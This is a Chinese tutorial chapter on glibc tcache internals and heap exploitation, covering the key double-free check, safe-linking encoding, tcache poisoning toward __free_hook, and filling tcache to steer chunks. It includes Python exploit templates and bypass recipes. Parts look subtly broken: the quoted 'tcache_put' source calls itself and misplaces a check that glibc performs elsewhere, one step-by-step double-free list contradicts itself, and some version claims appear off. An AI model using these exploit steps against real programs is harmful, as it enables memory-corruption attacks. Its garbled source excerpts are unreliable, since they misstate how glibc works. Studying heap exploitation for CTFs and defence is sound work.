# 第 3 章 tcache 源码全解：从 key 到 safe-linking

> tcache 是过去十年 glibc 堆利用变化最大的地方。搞清楚它的演进，你就明白了为什么有些老 exp 在新系统上跑不通。

---

## 3.1 tcache 的结构演进

### glibc 2.26（引入 tcache）

```c
typedef struct tcache_entry {
    struct tcache_entry *next;
} tcache_entry;

typedef struct tcache_perthread_struct {
    char counts[TCACHE_MAX_BINS];
    tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

**特点**：没有任何检查。double free 随便做，fd 随便改。这是 tcache 利用的「黄金时代」。

### glibc 2.29（加入 key）

```c
typedef struct tcache_entry {
    struct tcache_entry *next;
    uintptr_t key;             // 新增：记录所属 tcache
} tcache_entry;
```

free 时检查 `e->key == tcache`，防止 double free。

### glibc 2.32（加入 safe-linking）

指针编码：`PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr`

fd/next 不再直接存储地址，防止攻击者伪造。

### glibc 2.34+（tcache 中的指针全面编码）

fastbin 和 tcache 都使用 `PROTECT_PTR`/`REVEAL_PTR`，检查更严格。

---

## 3.2 key 检查的完整实现（2.31）

```c
static void tcache_put (mchunkptr chunk, size_t tc_idx) {
    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

    // 检查是否已经在 tcache 中
    if (__glibc_unlikely (e->key == tcache)) {
        tcache_entry *tmp;
        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
        // 遍历整个链表，确认 chunk 是否真的在链表中
        for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next) {
            if (tmp == e) {
                malloc_printerr ("free(): double free detected in tcache 2");
            }
        }
    }
    
    if (tcache->counts[tc_idx] < mp_.tcache_count) {
        tcache_put (chunk, tc_idx);
        return;
    }
}
```

**关键理解**：

1. `e->key == tcache` 只是**触发遍历**的条件，不是直接判 double free
2. 真正判断的是「遍历链表看这个 chunk 是否在其中」
3. 所以即使把 key 清零，如果 chunk 真的在链表里，遍历仍然会找到它

**绕过思路**：

- **方法 1**：free 后 malloc 出来（从 tcache 移除），修改内容后再 free — 此时 chunk 不在链表中，key 是 malloc 时清空的
- **方法 2**：用 UAF 同时修改 key 和 next（fd），构造复杂的链表操作
- **方法 3**：让两个不同 chunk 的 fd 互相指向对方，制造「假链表」

### 3.2.1 绕过实例（glibc 2.31）

```python
# 方法 1：malloc 出来再 free
add(0, 0x30, b'A')   # chunk A
delete(0)             # A 进 tcache，key = tcache
add(1, 0x30, b'B')   # malloc 拿到 A，key 被清空
delete(1)             # 再次 free，key 不是 tcache，通过检查！
# 现在 A 又在 tcache 里了
# 但这不是 double free，只是正常的 free-malloc-free 循环
```

要利用 double free，需要更精妙的操作。经典手法：

```text
1. 分配 A、B、C 三个同大小 chunk
2. free A → tcache: A
3. free B → tcache: B → A
4. UAF 修改 B->next = A（让链表变成 B → A → A？不，要注意 key）
5. malloc → 返回 B
6. 此时链表头是 A（B->next 的值）
7. 再 malloc → 返回 A，链表头 = A->next（可能是 NULL）
8. 再 malloc → ... 
```

这里的关键是：**通过修改 next 指针，让 tcache 链表指向我们想要的 chunk，而不是通过 double free**。

---

## 3.3 safe-linking 的数学原理（2.32+）

### 3.3.1 编码公式

```c
#define PROTECT_PTR(pos, ptr) \
    ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
```

- `pos`：存放指针的位置（即 &e->next）
- `ptr`：真实的下一个指针值
- `pos >> 12`：pos 右移 12 位（相当于除以 4096，即页号）

**为什么用页号**：堆地址的页号（高位）是相似的，异或后能打乱指针的低 12 位（页内偏移），让攻击者无法直接伪造。

### 3.3.2 解码过程

```c
static __always_inline void *REVEAL_PTR (void *ptr) {
    return PROTECT_PTR (&ptr, ptr);
}
```

解码时用**当前指针的位置**作为 key：

```c
// tcache_get 中
tcache_entry *e = tcache->entries[tc_idx];
tcache->entries[tc_idx] = REVEAL_PTR (e->next);
// REVEAL_PTR(&e->next, e->next) = ((&e->next) >> 12) ^ e->next
// 因为 e->next = PROTECT_PTR(&e->next, next_chunk)
// = ((&e->next)>>12) ^ next_chunk
// 所以 REVEAL_PTR = ((&e->next)>>12) ^ ((&e->next)>>12) ^ next_chunk = next_chunk
```

### 3.3.3 对利用的影响

攻击者要伪造 `e->next` 指向 `target_addr`，必须计算：

```python
def protect(pos, target):
    # pos 是 chunk 的 user data 地址（即 &e->next）
    return (pos >> 12) ^ target

# 知道 chunk 地址后
fake_next = protect(chunk_user_addr, target_addr)
```

**前提**：必须知道堆地址（`pos`）。所以 safe-linking 之后，**信息泄露（堆地址）成为利用的必要前置步骤**。

### 3.3.4 完整的 tcache poisoning（2.35）

```python
# 1. 泄露堆地址（通过 UAF 读 unsorted bin 的 fd，或从 main_arena 推算）
heap_base = leaked_chunk_addr - 0x2a0   # 根据布局调整

# 2. 计算 chunk 的 user data 地址
chunk_user = heap_base + 0x2e0   # 目标 chunk 的用户地址

# 3. 释放 chunk 进 tcache
delete(0)

# 4. 修改 next 指针（经过 safe-linking 编码）
target = free_hook_addr  # 或 IO_FILE 结构
fake_next = (chunk_user >> 12) ^ target
edit(0, p64(fake_next))

# 5. malloc 两次
add(1, size, b'X')       # 返回原 chunk
add(2, size, payload)    # 返回 target，写入数据
```

---

## 3.4 tcache 容量的利用

`mp_.tcache_count` 默认是 7。当 tcache 满了，free 的 chunk 会进入 fastbin/bin。这个特性可以用来：

1. **控制 chunk 的去向**：想让 chunk 进 fastbin（配合 fastbin attack）就先 free 7 个同大小 chunk 填满 tcache
2. **绕过 tcache 的 key 检查**：把 chunk 放进 fastbin 后操作，再从 fastbin 取回
3. **制造特定的 bin 状态**：为 unsorted bin attack / largebin attack 准备条件

```python
# 填满 tcache
for i in range(7):
    add(i, 0x30, b'A')
for i in range(7):
    delete(i)
# 现在 tcache[3] 满了，第 8 个 free 的 0x40 chunk 会进 fastbin
```

---

## 3.5 tcache 与其他 bin 的交互

当 tcache 满时，`_int_free` 会调用 `tcache_put` 失败，然后走 fastbin/bin 路径。但注意：

- **malloc 时优先从 tcache 取**：即使 fastbin 里有同大小 chunk
- **fastbin 的 chunk 不会自动进 tcache**：除非程序主动分配再释放

这个特性在某些利用中很关键：比如，你想让 chunk 从 fastbin 进入 tcache，需要先 malloc 它（从 fastbin 取出），再 free（进 tcache）。

---

## 3.6 调试 tcache

```gdb
# pwndbg 的 tcache 命令
tcache
# 输出：
# tcache[3] (0x40): 0x5555555592a0 -> 0x555555559260 -> ...
```

查看 key 和 next：

```gdb
# 找到 tcache_entry
p *(tcache_entry*)0x5555555592b0
# next = ...
# key = ...
```

在源码中下断点：

```gdb
b tcache_put
b tcache_get
run
```

---

## 3.7 小结

这一章我们深入剖析了 tcache：

- **2.26**：无检查，tcache 利用的黄金时代
- **2.29**：加入 key 检查（遍历链表确认）
- **2.32**：加入 safe-linking（`pos >> 12 ^ ptr` 编码）
- **绕过 key 检查**：malloc 出来再 free、修改 next 指针等
- **绕过 safe-linking**：必须知道堆地址，先泄露再编码伪造
- **tcache 容量**：填满后 chunk 进 fastbin/bin，可用来控制布局

下一章我们读 bins 的源码细节——unlink 宏、unsorted bin 遍历、largebin 插入。

---

**下一章**：[bins 的维护：解链与入链的源码细节](./ch04-bins源码.md)
